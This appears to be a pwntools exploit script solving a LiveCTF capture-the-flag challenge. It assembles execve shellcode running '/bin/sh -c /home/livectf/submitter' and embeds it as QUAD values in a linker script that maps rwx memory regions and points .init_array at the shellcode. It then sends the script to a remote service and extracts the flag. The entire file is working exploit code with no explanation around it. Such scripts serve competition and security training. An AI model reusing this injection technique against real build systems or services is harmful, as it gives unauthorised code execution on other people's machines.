from pwn import *

context.arch = 'amd64'

def to_qwords(bb):
    ret = []

    for cursor in range(0, len(bb), 8):
        if cursor + 8 < len(bb):
            ret.append(u64(bb[cursor:cursor + 8]))
        else:
            bx = bb[cursor:]
            pad = b'\x00' * (8 - len(bx))
            ret.append(u64(bx + pad))

    return ret


template = '''MEMORY 
{
    wtf1 (rwx)  : ORIGIN = 0x401000, LENGTH = 0x10000
    wtf2 (rwx)  : ORIGIN = 0x411000, LENGTH = 0x10000
    my_rwx_region (rwx)  : ORIGIN = 0x501000, LENGTH = 0x10000
}
SECTIONS
{
    .text : {
        QUAD(0x9090909090909090)
INSERT
        *(.text)
    } 
    .init_array : {
        LONG(0x401000)
    } 
    .data : {
        *(.data)
    } 
    .bss : {
        *(.bss)
    } 
}
'''

path = '/bin/sh'
argv = ['/bin/sh', '-c', "/home/livectf/submitter"]
envp = {}
shellme = b''
shellme += asm('xor rax, rax')
shellme += asm('xor rbx, rbx')
shellme += asm('xor rcx, rcx')
shellme += asm('xor rdx, rdx')
shellme += asm('xor rsi, rsi')
shellme += asm('xor rdi, rdi')
shellme += asm('xor r8, r8')
shellme += asm(shellcraft.amd64.linux.execve(path, argv, envp))
toq = to_qwords(shellme)

vv = []

for v in toq:
    vv.append(f'        QUAD({hex(v)})')

for v in toq:
    vv.append(f'        QUAD({hex(v)})')

for v in toq:
    vv.append(f'        QUAD({hex(v)})')

# print(template.replace('INSERT', '\n'.join(vv)))

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
r = remote(HOST, int(PORT))

r.sendline(template.replace('INSERT', '\n'.join(vv)).encode())
# result=r.recvlinesS(30)
flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

# r.interactive()
